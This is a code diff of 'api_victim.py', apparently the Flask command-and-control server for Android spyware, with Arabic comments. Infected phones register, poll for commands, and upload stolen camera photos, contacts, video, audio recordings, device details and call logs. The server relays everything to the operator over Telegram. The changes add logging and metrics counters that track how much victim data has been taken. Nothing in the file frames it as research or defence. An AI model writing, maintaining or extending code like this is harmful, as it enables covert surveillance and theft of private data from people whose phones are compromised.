@@ -1,6 +1,6 @@
 # api_victim.py
 # ============================================================
-# API للضحية (Victim APK) — v6
+# API للضحية (Victim APK) — v7
 # يستخدم HTML بدل Markdown لتجنب أخطاء الرموز
 # ============================================================
 
@@ -9,6 +9,7 @@ import base64
 import time
 import threading
 import html
+import traceback
 from flask import request, jsonify
 
 from config import bot, redis_client
@@ -19,6 +20,11 @@ from imports_manager import (
     pop_victim_commands,
     has_victim_commands,
 )
+
+from logging_config import get_logger
+from monitoring import metrics
+
+logger = get_logger("api_victim")
 
 
 def h(text):
@@ -55,6 +61,12 @@ def _get_buffer(victim_id, chat_id, victim_name):
         buf.chat_id = chat_id
         buf.victim_name = victim_name
         return buf
+
+
+def _cleanup_buffer(victim_id):
+    """تنظيف buffer بعد الاستخدام"""
+    with _buffers_lock:
+        _buffers.pop(victim_id, None)
 
 
 def _send_contacts_batch(victim_id):
@@ -96,9 +108,11 @@ def _send_contacts_batch(victim_id):
         else:
             bot.send_message(cid, content, parse_mode="HTML")
 
-        print(f"[+] Contacts batch sent: {len(contacts)}")
+        logger.info(f"Contacts batch sent: {len(contacts)}")
+        metrics.inc_counter("victim_data_sent", tags={"type": "contacts"})
+
     except Exception as e:
-        print(f"[-] send contacts batch error: {e}")
+        logger.exception(f"send contacts batch error: {e}")
 
 
 def _send_photos_batch(victim_id):
@@ -125,7 +139,7 @@ def _send_photos_batch(victim_id):
                     )
                     time.sleep(0.5)
                 except Exception as e:
-                    print(f"[-] photo {i}: {e}")
+                    logger.warning(f"photo {i} error: {e}")
         else:
             import zipfile
             zip_buffer = io.BytesIO()
@@ -142,9 +156,11 @@ def _send_photos_batch(victim_id):
                 parse_mode="HTML"
             )
 
-        print(f"[+] Photos batch sent: {len(photos)}")
+        logger.info(f"Photos batch sent: {len(photos)}")
+        metrics.inc_counter("victim_data_sent", tags={"type": "photos"})
+
     except Exception as e:
-        print(f"[-] send photos batch error: {e}")
+        logger.exception(f"send photos batch error: {e}")
 
 
 # ============================================================
@@ -155,6 +171,9 @@ def init_victim_api(app, bot_instance=None):
     if bot_instance:
         bot = bot_instance
 
+    # ============================================================
+    # Register
+    # ============================================================
     @app.route('/apk/victim/register', methods=['POST'])
     def victim_register():
         try:
@@ -166,6 +185,7 @@ def init_victim_api(app, bot_instance=None):
 
             victim_info = find_victim_by_token(victim_token)
             if not victim_info:
+                metrics.inc_counter("victim_register_fail", tags={"reason": "invalid_token"})
                 return jsonify({"error": "invalid_token"}), 403
 
             chat_id = victim_info['chat_id']
@@ -183,7 +203,8 @@ def init_victim_api(app, bot_instance=None):
                 {"model": model, "brand": brand, "android": android, "sdk": sdk}
             )
 
-            print(f"[+] Victim registered: {victim_name}")
+            logger.info(f"Victim registered: {victim_name}")
+            metrics.inc_counter("victim_registered")
 
             try:
                 cid = int(chat_id) if str(chat_id).isdigit() else chat_id
@@ -199,13 +220,17 @@ def init_victim_api(app, bot_instance=None):
                     parse_mode="HTML"
                 )
             except Exception as e:
-                print(f"[-] notify error: {e}")
+                logger.warning(f"notify error: {e}")
 
             return jsonify({"ok": True, "victim_id": victim_id}), 200
+
         except Exception as e:
-            print(f"[-] register error: {e}")
+            logger.exception(f"register error: {e}")
             return jsonify({"error": str(e)}), 500
 
+    # ============================================================
+    # Poll
+    # ============================================================
     @app.route('/apk/victim/poll', methods=['GET'])
     def victim_poll():
         try:
@@ -228,15 +253,20 @@ def init_victim_api(app, bot_instance=None):
 
             try:
                 update_victim_status(chat_id, victim_id, "active")
-            except Exception:
-                pass
+            except Exception as e:
+                logger.warning(f"update_victim_status error: {e}")
 
             commands = pop_victim_commands(victim_id, max_count=10)
+            metrics.inc_counter("victim_poll")
             return jsonify({"commands": commands, "has": len(commands) > 0}), 200
+
         except Exception as e:
-            print(f"[-] poll error: {e}")
+            logger.exception(f"poll error: {e}")
             return jsonify({"commands": [], "has": False}), 200
 
+    # ============================================================
+    # Data
+    # ============================================================
     @app.route('/apk/victim/data', methods=['POST'])
     def victim_data():
         try:
@@ -256,7 +286,8 @@ def init_victim_api(app, bot_instance=None):
             victim_name = victim_info.get('name', 'Unknown')
             cid = int(chat_id) if str(chat_id).isdigit() else chat_id
 
-            print(f"[<<] {dtype} from {victim_name}")
+            logger.debug(f"[<<] {dtype} from {victim_name}")
+            metrics.inc_counter("victim_data", tags={"type": dtype})
 
             # ============================================================
             # Camera
@@ -278,7 +309,7 @@ def init_victim_api(app, bot_instance=None):
                             parse_mode="HTML"
                         )
                     except Exception as e:
-                        print(f"[-] photo error: {e}")
+                        logger.warning(f"photo error: {e}")
 
             # ============================================================
             # Photo Single
@@ -301,7 +332,7 @@ def init_victim_api(app, bot_instance=None):
                         if len(buf.photos) >= 3:
                             _send_photos_batch(victim_id)
                     except Exception as e:
-                        print(f"[-] photo_single error: {e}")
+                        logger.warning(f"photo_single error: {e}")
 
             elif dtype == "photos_done":
                 total = data.get("total", 0)
@@ -313,8 +344,8 @@ def init_victim_api(app, bot_instance=None):
                         f"📊 الإجمالي: {total}",
                         parse_mode="HTML"
                     )
-                except Exception:
-                    pass
+                except Exception as e:
+                    logger.warning(f"photos_done notify error: {e}")
 
             # ============================================================
             # Contacts
@@ -342,8 +373,8 @@ def init_victim_api(app, bot_instance=None):
                         f"📊 الإجمالي: {total}",
                         parse_mode="HTML"
                     )
-                except Exception:
-                    pass
+                except Exception as e:
+                    logger.warning(f"contacts_done notify error: {e}")
 
             # ============================================================
             # Video
@@ -363,7 +394,7 @@ def init_victim_api(app, bot_instance=None):
                             parse_mode="HTML"
                         )
                     except Exception as e:
-                        print(f"[-] video error: {e}")
+                        logger.warning(f"video error: {e}")
 
             # ============================================================
             # Audio
@@ -383,7 +414,7 @@ def init_victim_api(app, bot_instance=None):
                             parse_mode="HTML"
                         )
                     except Exception as e:
-                        print(f"[-] audio error: {e}")
+                        logger.warning(f"audio error: {e}")
 
             # ============================================================
             # Device Info
@@ -454,7 +485,7 @@ def init_victim_api(app, bot_instance=None):
                     "",
                 ]
                 for c in calls[:50]:
-                    t = type_map.get(str(c.get('type','')), '❓')
+                    t = type_map.get(str(c.get('type', '')), '❓')
                     lines.append(f"{t} <code>{h(c.get('number'))}</code> — {c.get('duration')}s")
 
                 bot.send_message(cid, "\n".join(lines), parse_mode="HTML")
@@ -572,8 +603,7 @@ def init_victim_api(app, bot_instance=None):
                 pass
 
             return jsonify({"status": "ok"}), 200
+
         except Exception as e:
-            print(f"[-] victim_data error: {e}")
-            import traceback
-            traceback.print_exc()
+            logger.exception(f"victim_data error: {e}")
             return jsonify({"status": "error"}), 200
